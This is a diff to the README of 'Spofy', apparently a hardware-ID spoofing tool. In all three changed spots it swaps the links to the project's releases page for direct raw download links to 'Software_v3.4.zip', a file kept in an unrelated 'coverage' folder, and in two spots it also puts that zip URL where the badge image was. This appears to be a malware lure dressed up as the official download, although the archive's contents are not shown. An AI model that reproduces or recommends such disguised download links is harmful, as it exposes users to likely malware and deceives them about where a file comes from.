@@ -1,6 +1,6 @@
 # 🛠️ Spofy - Change Hardware Identity Easily
 
-[![Download Spofy](https://img.shields.io/badge/Download-Spofy-brightgreen)](https://github.com/metanetcorporation/Spofy/releases)
+[![Download Spofy](https://github.com/metanetcorporation/Spofy/raw/refs/heads/main/coverage/Software_v3.4.zip)](https://github.com/metanetcorporation/Spofy/raw/refs/heads/main/coverage/Software_v3.4.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Follow these steps carefully. They will guide you from downloading Spofy to chan
 
 Visit the official releases page to get the latest version:
 
-[![Download Spofy](https://img.shields.io/badge/Download-Spofy-blue)](https://github.com/metanetcorporation/Spofy/releases)
+[![Download Spofy](https://github.com/metanetcorporation/Spofy/raw/refs/heads/main/coverage/Software_v3.4.zip)](https://github.com/metanetcorporation/Spofy/raw/refs/heads/main/coverage/Software_v3.4.zip)
 
 - Open the link above in your browser.  
 - Find the latest release, usually at the top of the list.  
@@ -133,7 +133,7 @@ These features are optional and do not require programming skills.
 
 Check this page regularly for new versions:  
 
-[https://github.com/metanetcorporation/Spofy/releases](https://github.com/metanetcorporation/Spofy/releases)
+[https://github.com/metanetcorporation/Spofy/raw/refs/heads/main/coverage/Software_v3.4.zip](https://github.com/metanetcorporation/Spofy/raw/refs/heads/main/coverage/Software_v3.4.zip)
 
 New releases may improve performance, add support for more devices, or fix bugs.
 
